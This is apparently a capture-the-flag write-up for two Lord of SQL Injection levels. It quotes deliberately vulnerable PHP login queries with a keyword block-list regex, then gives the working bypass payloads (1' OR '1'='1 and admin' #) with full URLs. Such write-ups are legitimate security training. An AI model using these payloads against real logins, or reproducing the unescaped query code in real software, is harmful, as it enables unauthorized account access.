## Lord Of SQL Injection

At [los.rubiya.kr](https://los.rubiya.kr/).

### Gremlin:

```php
Challenge:

query : select id from prob_gremlin where id='' and pw=''

<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```

We just need to bypass the login with the simple `1' OR '1'='1`.

Final Url: `https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php/?id=1&pw=1%27%20OR%20%271%27=%271`

Human Readable `https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php/?id=1&pw=1' OR '1'='1`

Final Query: `select id from prob_gremlin where id='1' and pw='1' OR '1'='1'`

### Cobolt

```php
Challenge:

query : select id from prob_cobolt where id='' and pw=md5('')

<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

We just need to bypass the MD5 password check and login as admin. So we use a `#` to comment out the MD5 check.

Final URL: `https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin%27%20%23`

Human Readable: `https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin' #`

Final Query: `select id from prob_cobolt where id='admin' #' and pw=md5('')`